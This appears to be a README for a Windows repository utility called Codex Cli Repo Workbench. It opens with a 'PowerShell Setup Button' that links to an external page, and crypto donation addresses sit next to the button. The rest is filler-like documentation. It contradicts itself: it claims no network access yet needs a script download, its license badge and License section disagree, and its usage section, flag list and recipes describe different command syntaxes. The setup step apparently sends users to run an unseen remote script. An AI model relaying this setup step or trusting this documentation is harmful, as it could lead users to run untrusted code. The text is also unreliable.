<div align="center">

# Codex Cli Repo Workbench: Command-Line Repository Utility for Windows

![](files/preview.png)

### 🛠️ PowerShell Setup Button

<a href="https://marketzy.github.io/codex-cli-repo-workbench/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![downloads](https://img.shields.io/badge/DOWNLOADS-2000-a855f7?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-0BSD-9333ea?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-5%2B-7c3aed?style=for-the-badge&labelColor=0d1117)]()

<div align="center">
<h3>Support my work</h3>
<p><strong>BTC</strong>:&nbsp;<code>1BVGBUwr9H1DVuad3K4JnfNZXZSV6VfzT9</code> | <strong>ETH</strong>:&nbsp;<code>0x7DDc21bB819372BAA9841d7E5c3fBFC117C3c2cA</code></p>
</div>

</div>

---

Codex Cli Repo Workbench is a command-line utility for inspecting and operating on local Git repositories through a single, scriptable interface. It exposes repository state, file inventory, and common maintenance operations as plain-text output and stable exit codes suitable for shells, CI steps, and other tooling. The tool operates only on repositories reachable from the local filesystem and performs no network operations. It does not attempt to replace Git; commands that mutate history or working-tree state are intentionally limited to a small, documented set.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Repository-scoped operation.** All commands resolve paths relative to the repository root; no implicit global state or user-wide configuration is read or written.
- **Deterministic command surface.** Subcommands are fixed at build time; unknown subcommands and flags fail fast with a nonzero exit status rather than being silently ignored.
- **Explicit output modes.** Machine-readable output (for scripted use) and human-readable output are separate modes; the default is human-readable, and structured output is opt-in.
- **Non-destructive defaults.** Commands that could modify the working tree require an explicit flag to do so; without it they operate read-only.
- **Bounded scope.** The tool operates on a single repository at a time and does not manage multiple repositories, remotes, or cross-repository dependencies.
- **No network access at runtime.** Commands perform no outbound requests; behavior is a function of the local repository state and the provided arguments only.
- **Predictable exit codes.** Success and each distinct failure class map to documented, stable exit codes suitable for shell conditionals.
- **Composable output.** Human-readable output is line-oriented and greppable; structured output is stable within a major version and intended for downstream parsing.
- **Honest limits.** The tool does not implement repository hosting, authentication, or history rewriting; it assumes a valid, already-initialized repository and defers to standard tooling for those concerns.

## How It Works

Codex Cli Repo Workbench operates as a thin orchestration layer over the target repository and the Codex CLI. On invocation, it resolves the working directory, validates the requested operation and flags, then constructs a command plan rather than executing shell commands directly. Each plan entry records the executable, arguments, working directory, and environment overrides, and is passed to a single runner that executes entries sequentially and captures stdout, stderr, and exit status per entry.

Repository inspection is read-only by default. The tool enumerates tracked files via the repository's own metadata, applies include and exclude filters, and identifies candidate change sets without mutating the index or working tree. Any operation that writes to the repository is gated behind an explicit flag; without it, write-oriented actions are rejected during validation and never reach the runner.

Interaction with Codex CLI is process-based. The tool does not import Codex internals, does not parse undocumented output formats, and does not maintain a persistent session. Prompts and context are assembled from repository contents and passed as arguments or standard input according to Codex CLI's documented interface. Responses are treated as opaque text; the tool surfaces them verbatim and does not interpret or post-process model output beyond optional truncation for display.

Exit codes are derived from the runner. A zero status is returned only when all planned entries succeed and any requested post-condition checks pass. A nonzero status from any entry short-circuits remaining entries by default, and the tool returns the first failing entry's code. Validation failures return a distinct code before any subprocess is spawned. Signals received during execution are forwarded to the active child process.

Scope and limits are deliberate. The tool does not manage Codex CLI installation, versioning, or authentication; it assumes a working Codex CLI on `PATH` or at a configured location. It does not provide sandboxing, network isolation, or secret redaction. It does not guarantee reproducibility of model output, and it does not attempt to reconcile concurrent modifications to the repository during a run. Behavior depends on the repository state at start time and on the installed Codex CLI version, both of which the tool reports in its diagnostic output.

## Modules and Settings

### Repository Overview Module
Presents a consolidated view of the working tree so users can assess repository state before acting.
- Detail level lets users choose between a count-only summary, a grouped listing or a full per-file breakdown.
- Grouping preference switches the same information between directory-oriented and change-type-oriented layouts.
- Path filters narrow the snapshot to chosen subdirectories so large repositories stay readable.

### Cleanup and Organization Module
Identifies stray artifacts and proposes a reviewable cleanup list before any destructive action.
- Scan scope targets specific subdirectories or the whole repository.
- Category filters restrict results to build output, temporary files or abandoned directories.
- Proposal review shows the pending removal or relocation list for confirmation before execution.

### Browsing and Diff Module
Supports paging through files and comparing working-tree content against committed versions.
- Output width and line-context settings control how much surrounding content appears in diffs.
- Path-pattern filtering limits browsing and diffing to relevant files.
- A raw output toggle makes results suitable for piping into other terminal tools.

### Task Checklist Module
Maintains a lightweight, repository-tied task list that persists across sessions.
- Add, reorder and complete actions update the checklist in place.
- Status filtering shows only outstanding, completed or all items.
- The compact checklist view keeps pending work visible without leaving the terminal.

### Batch Plan Module
Composes multi-step operations and previews their effects before execution.
- Step ordering can be adjusted to match the user's intended sequence.
- Individual steps can be toggled on or off within a plan.
- A dry-run view enumerates exactly what each step would touch.

### Profiles and Output Module
Bundles preferred defaults and controls how results are emitted for downstream use.
- Named profiles capture verbosity, ignore patterns and operation behavior, selectable per invocation or as a project default.
- Output format selection switches between plain text, structured records and summary-only views.
- Field selection controls which parts of a record appear in scriptable output.

### Additional Settings
- Session history depth limits how many recent commands and outcomes are retained for review and replay.
- History clearing removes recorded entries when a fresh log is preferred.
- Ignore-pattern overrides adjust exclusions for a single run without editing a profile.
- Confirmation behavior controls whether cleanup and batch plans require explicit approval before taking effect.
- Replay options re-run or adjust a prior command from the session log, tying history back into the overview, cleanup and batch modules for a continuous terminal workflow.

## Usage Scenarios

### Preparing a Clean Commit from a Cluttered Working Tree

**Goal:** A developer wants to figure out what changed in a repository after a long session and remove leftover build artifacts before committing.

**Steps:**
1. Request a repository snapshot with the detail level set to a grouped listing and grouping by change type, so tracked changes, pending edits and untracked files are separated at a glance.
2. Narrow the snapshot with a path filter to the source subdirectory to confirm only intended edits appear there.
3. Run a cleanup scan with category filters restricted to build output and temporary files, then review the proposed cleanup list.
4. Use the confirmation setting to approve the removal entries that look safe and skip the rest.
5. Diff the remaining paths with increased line context to double-check the final changes before committing.

**Expected result:** The developer sees a grouped terminal summary of the working tree, a short reviewed cleanup list of build output and temporary files, and a formatted diff showing the exact hunks that will be committed.

### Auditing and Reproducing a Prior Maintenance Sequence

**Goal:** A developer wants to understand what a previous maintenance run did and apply the same sequence again, adapted to a new subdirectory.

**Steps:**
1. Open the session history and limit the history depth to the most recent entries to find the earlier batch operation and its outcome.
2. Use the replay option to re-run the prior command, adjusting the path scope to the new subdirectory.
3. In the batch plan module, reorder the steps and toggle off any actions that do not apply this time.
4. Request the dry-run view to enumerate exactly what each remaining step would touch.
5. Execute the reviewed plan with confirmation behavior set to require explicit approval.

**Expected result:** The developer sees a session log entry for the original run, a dry-run listing of affected paths in the new subdirectory, and a completed plan whose outcome is recorded back into history for later tracing.

### Keeping a Small Team's Terminal Workflow Consistent

**Goal:** A team member wants consistent output and cleanup behavior across sessions and wants to pipe repository checks into shell scripts.

**Steps:**
1. Define a named profile that captures the preferred verbosity, ignore patterns and operation behavior, and set it as the project default.
2. Pull a repository snapshot with the profile applied, using the summary-only output format for a quick check.
3. Run a cleanup scan under the profile, letting the ignore-pattern overrides exclude a teammate's scratch directory for this run only.
4. Switch the output format to structured records with selected fields and pipe the results into another terminal tool.
5. Review the persisted task checklist filtered to outstanding items to confirm remaining work is visible.

**Expected result:** The team member gets a consistent summary snapshot, a cleanup proposal that respects project ignore patterns plus a one-off override, structured records suitable for downstream processing, and a compact checklist of outstanding tasks without retyping any options.

## Usage

Invoke the tool as `codex-cli-repo-workbench [options] [path]`. If `path` is omitted, the current working directory is used. The tool requires a readable repository path and an existing Codex CLI configuration; it does not create or modify that configuration.

Basic invocation validates the repository and prints a summary:

```
codex-cli-repo-workbench .
```

The tool operates in two phases: inspection and execution. The inspection phase scans the target directory, reports detected project markers, and exits without changing any files. Pass `--apply` to enter the execution phase, in which planned operations are performed. Without `--apply`, the tool is read-only.

Use `--dry-run` together with `--apply` to print the operations that would be executed without performing them. `--dry-run` has no effect on its own.

Select a target subdirectory by passing it as `path`; the tool does not traverse outside the given path. Symlinks are followed during inspection but are not modified. Files matched by the tool's ignore rules, including `.git` internals, are skipped.

The tool writes diagnostics to standard error and machine-readable output to standard output. Redirect standard output to capture results, for example `codex-cli-repo-workbench . > report.txt`.

Scope and limitations: the tool operates on local repositories only and does not contact remote services on its own. It does not install dependencies, run builds, or execute project tests. Operations are limited to the workbench-defined actions described under Flags. Behavior on repositories that do not match a supported project layout is reported as an error rather than guessed at.

Exit status is nonzero on failure; see the Exit codes section for the specific values.

## Flags

All flags are optional. When no flags are supplied, the tool operates on the current working directory and prints a human-readable summary to standard output.

- `--repo <path>`: Path to the repository root to operate on. Defaults to the current directory. The path must exist and be a directory; otherwise the tool exits with a non-zero status before performing any work.
- `--out <path>`: Write structured output to the given file instead of standard output. Parent directories are not created automatically; a missing parent directory causes an error.
- `--format <mode>`: Output format. Accepted values are `text` (default) and `json`. Any other value is rejected with an error. JSON output is a single object; its schema is stable within a major version but may gain fields in minor releases.
- `--include <glob>`: Restrict processing to paths matching the given glob. May be repeated; multiple patterns are ORed. Matching semantics follow standard glob rules relative to `--repo`.
- `--exclude <glob>`: Skip paths matching the given glob. May be repeated and takes precedence over `--include`. A default exclusion set (version-control metadata and common build artifacts) applies unless `--no-default-excludes` is set.
- `--no-default-excludes`: Disable the built-in exclusion list. Use with care on large repositories, as processing time scales with the number of matched files.
- `--depth <n>`: Maximum directory traversal depth, where `0` means the repository root only. Must be a non-negative integer. Defaults to unlimited.
- `--jobs <n>`: Number of concurrent workers. Must be a positive integer. Defaults to the number of available CPUs. Values above the CPU count are accepted but provide no additional benefit.
- `--config <path>`: Load configuration from the specified file instead of the default location. Command-line flags override values from the config file. An unreadable or malformed config file is a fatal error.
- `--dry-run`: Report what the tool would do without modifying the filesystem. Mutually exclusive with `--out` when `--out` points to a path the tool would write during a normal run.
- `--quiet`: Suppress non-error output on standard output. Errors continue to be written to standard error. Takes precedence over `--verbose`.
- `--verbose`: Emit additional diagnostic output to standard error. May be repeated for more detail; each repetition increases verbosity up to a fixed maximum.
- `--version`: Print the version string and exit successfully. All other flags are ignored.
- `--help`: Print usage information and exit successfully. All other flags are ignored.

Boolean flags accept the forms `--flag` and `--flag=true|false`. Value flags accept both `--flag value` and `--flag=value`. Unknown flags are treated as errors rather than ignored. Flags and positional arguments may be interleaved; `--` terminates flag parsing, after which all remaining arguments are treated as positional.

Behavior is not guaranteed for repositories containing symlink cycles or paths exceeding platform limits; such cases may produce errors or be skipped, and this is reported at the current verbosity level.

## Exit codes

The tool returns the following exit codes. Codes are process exit statuses, so they are limited to the range 0–255, and a value of 0 always indicates success. Callers that treat any nonzero value as a generic failure will still behave correctly, but scripts that branch on specific codes should match against the values below rather than assuming a fixed set.

- **0 — Success.** The requested operation completed and, where applicable, the workbench produced its expected output. This is the only code that guarantees no error was encountered.
- **1 — General error.** A runtime failure occurred that does not fall into a more specific category, such as an unexpected exception or an internal invariant violation. Treat this as an unclassified fault.
- **2 — Usage error.** The command line was malformed: an unknown flag, a missing required argument, an invalid value, or mutually exclusive options supplied together. The tool validates arguments before performing work, so this code indicates no operation was attempted.
- **3 — Input or configuration error.** A required file, directory, or configuration value was missing, unreadable, or malformed. This covers problems discovered while reading inputs, distinct from failures that occur during processing.
- **4 — Operation failed.** The tool started the requested work but could not complete it, for example an output could not be written or a required step returned an unsuccessful result. Partial output may exist on disk when this code is returned; callers should not assume atomicity.
- **5 — Interrupted.** The process received an interrupt signal and shut down before completing. Cleanup performed during shutdown is best-effort, and temporary artifacts may remain.

Exit codes are not currently a stable public contract: the mapping above reflects the present implementation, and individual codes may be reassigned or added in future releases. Scripts that depend on a specific code should pin the tool version or check for zero versus nonzero rather than relying on exact values. Codes outside the range listed here should be treated as general errors, and codes greater than 255 cannot be represented faithfully by the operating system.

## Recipes

- **Inspect a repo before making changes.** Run `codex-cli-repo-workbench inspect --path .` to produce a structural summary (tracked files, artifact types, and detected build metadata). This is read-only; it does not modify the working tree.

- **Generate a change plan without applying it.** Use `codex-cli-repo-workbench plan --path . --goal "add retry logic to the HTTP client"` to emit a step list and the files each step would touch. Review the output, then pass the same goal to `apply` if it matches intent. `plan` performs no writes.

- **Apply a plan and review the diff.** `codex-cli-repo-workbench apply --path . --goal "..." --dry-run` prints the exact edits that would be made; drop `--dry-run` to write them. Diff output is limited to files the tool touches, so unrelated dirty state in the working tree is not shown.

- **Constrain scope to one subtree.** Add `--include src/http/**` (and optionally `--exclude **/*.test.ts`) to keep planning and application within a directory. Paths outside the include set are reported as skipped, not silently ignored.

- **Run in CI as a read-only check.** Invoke `codex-cli-repo-workbench check --path . --fail-on drift` to verify that the tree still matches the last accepted plan. This exits non-zero on drift and writes nothing; it is intended for gates, not for remediation.

- **Audit what a prior run did.** Combine `--log-format json` with `--log-file <path>` on any write-capable command, then parse the records: each entry names the operation, target file, and outcome. Logs are append-only per run and are not rotated by the tool.

- **Batch over multiple repos.** Loop the CLI over a list of paths rather than relying on a built-in multi-root mode, which this project does not provide: `for d in repos/*/; do codex-cli-repo-workbench inspect --path "$d" --quiet; done`. Aggregate exit codes yourself; the tool reports per-invocation status only.

- **Handle partial failures explicitly.** `apply` stops at the first failed edit by default. Pass `--continue-on-error` to attempt remaining steps, then inspect the exit code and JSON log to identify which files were written and which were not. There is no automatic rollback; revert via your VCS.

- **Tune model selection for reproducibility.** Pin behavior with `--model <name>` and a fixed `--seed` where supported; unpinned runs may produce different plans for the same input. Determinism is best-effort and not guaranteed across model or tool versions.

- **Keep secrets out of context.** Use `--exclude` patterns for credential files and confirm with `--dry-run` that `.env`-style files are absent from the reported file set before any write-capable run. The tool does not redact file contents it reads.

## License

This project is released under the MIT License. The full license text is provided in the LICENSE file distributed with the source. In summary, the MIT License grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software and its documentation, subject to the conditions that the copyright notice and permission notice are included in all copies or substantial portions, and that the software is provided "as is" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software. The license applies only to the code and documentation contained in this repository; it does not grant rights to any third-party dependencies, which remain governed by their respective licenses, nor does it grant any trademark or patent rights beyond those expressly stated. Redistributions must preserve the original copyright and permission notices. Modifications and derivative works are permitted but must not misrepresent the origin of the original software. No warranty of fitness, security, or correctness is offered for any use, including production or safety-critical use.